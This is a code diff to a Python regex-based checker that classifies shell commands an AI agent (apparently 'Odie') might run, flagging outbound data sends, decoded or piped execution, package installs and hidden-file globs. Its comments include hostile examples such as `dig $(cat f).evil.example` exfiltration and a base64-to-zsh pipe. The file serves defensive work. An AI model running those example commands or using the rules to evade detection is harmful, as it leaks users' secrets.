@@ -37,19 +37,25 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"\bcurl\b[^|;]*(-X\s*(POST|PUT|PATCH|DELETE)|--data|\s-d\s|\s-F\s|--form|\s-T\s|--upload|\s-K\s|--config)|\bwget\b[^|;]*--post|"
         r"\b(scp|ssh|ftp|sftp|nc|ncat|sendmail|telnet|socat)\b|\brsync\b[^|;]*\S+:|"
         r"\brequests\.(post|put|patch|delete)\b|\bhttpx\.(post|put|patch|delete)\b|\bsmtplib\b|"
-        r"method\s*:\s*['\"](POST|PUT|PATCH|DELETE)")),
+        r"method\s*:\s*['\"](?i:post|put|patch|delete)")),  # fetch takes the method in any case
     # An address built at run time carries whatever was put into it: curl 'https://x/?d='$(cat f), wget "$URL$DATA",
     # requests.get(base + secret), urlopen(f"...{key}"). Only a fixed address is a plain read.
+    # A name looked up or opened carries it too: dig $(cat f).evil.example, open 'https://x/?d='$(cat f).
     ("sends data out (an address built from other text)", re.compile(
-        r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
+        r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client|dig|nslookup|host|ping)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
+        r"\bopen\s+['\"]?https?://[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
         r"\b(requests\.(get|head)|httpx\.(get|head)|urlopen|urlretrieve|fetch|axios\.get|http\.get|https\.get)\s*\([^)]*"
         r"(\+|\bf['\"]|\.format\(|%\s*\(|\$\{|`)")),
     # Text that is data until it's decoded or piped: `echo <base64> | base64 -d | zsh` shows no command until it runs.
+    # Piping into a reader (xargs grep, python3 -m json.tool) and sourcing a venv's activate are ordinary work, not text
+    # run as commands; a shell given a substitution (`zsh -c "$(…)"`, `bash <(…)`) is.
     ("runs text as commands", re.compile(
-        r"\|\s*(sudo\s+)?(sh|bash|zsh|dash|fish|ksh|python3?|node|ruby|perl|osascript|xargs|source|eval|exec)\b|"
-        r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+\S|(^|[;&|(]\s*)\.\s+\S|"
+        r"\|\s*(sudo\s+)?(sh|bash|zsh|dash|fish|ksh|python3?(?!\s+-m\s+json\.tool\b)|node|ruby|perl|osascript|"
+        r"xargs(?!\s+(grep|wc|ls|cat|head|tail|echo|basename|dirname|stat|file|sort|uniq)\b)|source|eval|exec)\b|"
+        r"\b(sh|bash|zsh|dash|fish|ksh)\s+(-\w+\s+)*(-c\s+[\"']?\$\(|<\()|"
+        r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+(?!\S*/activate\b)\S|(^|[;&|(]\s*)\.\s+(?!\S*/activate\b)\S|"
         r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|\\x[0-9a-fA-F]{2}|"
-        r"\bexec\(|\bcompile\(|__import__\(|\bimportlib\b|\bnew\s+Function\(|\bvm\.run")),
+        r"\bexec\(|__import__\(|\bnew\s+Function\(|\bvm\.run")),
     # What the owner's choice lets inline code do stops at writing files it couldn't write from the shell (unsafe_write
     # sees only > redirections): python3 -c "open(p, 'w')" is a write like any other.
     ("writes a file from code", re.compile(
@@ -64,7 +70,7 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
     # Installing a package runs its install scripts: npm's postinstall, pip's setup.py, brew's formula.
     ("installs software (runs its install scripts)", re.compile(
         r"\b(npm|pnpm|yarn|bun)\s+(i|install|add|ci|up|update|upgrade|exec|x)\b|\bnpx\b|\bpip3?\s+(install|download)\b|"
-        r"\buv\s+(pip\s+install|add|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
+        r"\buv\s+(pip\s+install|add|sync|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
         r"\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get|run)\b|\bconda\s+install\b|\bport\s+install\b|"
         r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b")),
     ("edits files in place", re.compile(r"\b(sed|perl)\s+(-\w*\s+)*-i|\btee\b")),
@@ -74,7 +80,7 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
 _HIDDEN_PATH = re.compile(r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s'\"]+|/home/[^/\s'\"]+)/\.[^\s;&|<>]*")
 _GLOBBED = re.compile(r"[?*\[\]{}]|\$\(|`|\$\{?[A-Za-z_]")  # a pattern or a substitution: the real name is decided at run time
 _ONE_OF = re.compile(r"\[(.)\]")  # [v]: a glob that matches exactly that one character
-_SQUEEZE = re.compile(r"[\\'\"?*]")  # quotes, backslashes and one-character globs that spell a word around a rule
+_SQUEEZE = re.compile(r"\$(?=['\"])|[\\'\"?*]")  # quotes (ANSI-C $'…' too), backslashes and one-character globs that spell a word around a rule
 _REDIRECT = re.compile(r"\d?>>?\s*(&\d*|'[^']*'|\"[^\"]*\"|[^\s;&|<>]+)")
 _HEREDOC = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")
 _INTERPRETER = re.compile(r"\b(python3?|node|ruby|perl|osascript|bash|sh|zsh|deno|bun)\b")
@@ -205,11 +211,13 @@ def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
     safe place (Odie's workspace, under ~/.odie) is fine: it can only name files there.
     `cat ~/.{e,x}nv` -> True; `ls ~/.odie/*` -> True; `cat ~/.$(echo e)nv` -> True; `cat ~/.agentd/profiles/x/SKILL.md`
     -> False (a plain name, judged by the rules); `ls ~/Downloads/*.pdf` -> False (not hidden);
-    `ls ~/.odie/workspace/*.md` with the workspace safe -> False."""
+    `ls ~/.odie/workspace/*.md` with the workspace safe -> False; `ls $HOME/.odie/workspace` -> False ($HOME is the home,
+    not a pattern: only the part after it is read)."""
     home = os.path.realpath(os.path.expanduser("~"))
     for path in _HIDDEN_PATH.finditer(shell):
         text = path.group(0)
-        pattern = _GLOBBED.search(text)
+        prefix = len(path.group(1))  # ~, $HOME, ${HOME}, /Users/x: the home itself, however it is spelled
+        pattern = _GLOBBED.search(text, prefix)
         if pattern is None:
             continue
         fixed_part = text[:pattern.start()]
